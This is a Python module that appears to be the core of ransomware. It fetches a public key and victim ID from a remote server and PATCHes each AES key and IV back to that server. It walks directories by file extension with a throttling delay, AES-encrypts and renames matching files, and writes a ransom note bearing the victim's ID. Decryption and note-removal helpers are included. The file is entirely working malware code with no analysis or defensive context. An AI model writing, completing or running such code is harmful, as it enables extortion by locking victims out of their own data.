import base64
import json
import os
import time
from typing import Iterable, TypedDict
from urllib import request

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, padding, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asymmetric_padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


class Response(TypedDict):
    uuid: str
    public_key: str


def generate_public_key(url: str) -> Response:
    with request.urlopen(request.Request(url, method="POST")) as response:
        return json.loads(response.read())


def update_db(url: str, id: str, aes_key: bytes, aes_iv: bytes) -> None:
    data = json.dumps(
        {
            "aes_key": base64.b64encode(aes_key).decode(),
            "aes_iv": base64.b64encode(aes_iv).decode(),
        }
    )

    req = request.Request(f"{url}/{id}", data=data.encode(), method="PATCH")
    req.add_header("Content-Type", "application/json")

    request.urlopen(req)


def generate_private_key() -> rsa.RSAPrivateKey:
    return rsa.generate_private_key(
        public_exponent=65537,
        key_size=1024,
    )


def get_pair(
    private_key: rsa.RSAPrivateKey,
) -> tuple[bytes, bytes]:  # private key, public key
    public_key = private_key.public_key()

    private_key_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    public_key_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    return private_key_pem, public_key_pem


def get_file_ext(name: str) -> str:
    i = name.rfind(".")
    if 0 < i < len(name) - 1:
        return name[i:]
    return ""


def get_dirs_and_files(
    root_dirs: list[str],
    exclude_dirs: list[str],
    file_exts: list[str],
    interval: float,
) -> Iterable[str]:
    for root_dir in root_dirs:
        for dir_path, dirs, files in os.walk(root_dir):
            dirs[:] = [
                dir for dir in dirs if os.path.join(dir_path, dir) not in exclude_dirs
            ]

            for file in files:
                if get_file_ext(file) in file_exts:
                    yield os.path.join(dir_path, file)

                    if interval:
                        time.sleep(interval)

            yield dir_path


def load_public_key(public_key_pem: bytes) -> rsa.RSAPublicKey:
    return serialization.load_pem_public_key(public_key_pem, backend=default_backend())


def load_private_key(private_key_pem: bytes) -> rsa.RSAPublicKey:
    return serialization.load_pem_private_key(
        private_key_pem, password=None, backend=default_backend()
    )


def encrypt_key(key: bytes, public_key: rsa.RSAPublicKey) -> bytes:
    return public_key.encrypt(
        key,
        asymmetric_padding.OAEP(
            mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


def decrypt_key(key: bytes, private_key: rsa.RSAPrivateKey) -> bytes:
    return private_key.decrypt(
        key,
        asymmetric_padding.OAEP(
            mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


def create_cipher(key: bytes, iv: bytes) -> Cipher:
    return Cipher(algorithms.AES(key), modes.CBC(iv))


def encrypt_file(file: str, cipher: Cipher, block_size: int, file_ext: str) -> None:
    with open(file, "rb") as f:
        encryptor = cipher.encryptor()

        padder = padding.PKCS7(block_size).padder()
        padded_data = padder.update(f.read())
        padded_data += padder.finalize()

        enc_data = encryptor.update(padded_data)
        enc_data += encryptor.finalize()

        os.rename(file, file + file_ext)

        with open(file + file_ext, "wb") as f:
            f.write(enc_data)


def decrypt_file(file: str, cipher: Cipher, block_size: int, file_ext: str) -> None:
    with open(file, "rb") as f:
        decryptor = cipher.decryptor()

        dec_data = decryptor.update(f.read())
        dec_data += decryptor.finalize()

        unpadder = padding.PKCS7(block_size).unpadder()
        unpadded_data = unpadder.update(dec_data)
        unpadded_data += unpadder.finalize()

        os.rename(file, file[: -len(file_ext)])

        with open(file[: -len(file_ext)], "wb") as f:
            f.write(unpadded_data)


def write_readme(dir_path: str, file: str, message: str, user_id: str) -> None:
    with open(os.path.join(dir_path, file), "w") as f:
        f.write(message.format(id=user_id))


def delete_readme(dir_path: str, file: str) -> None:
    os.remove(os.path.join(dir_path, file))
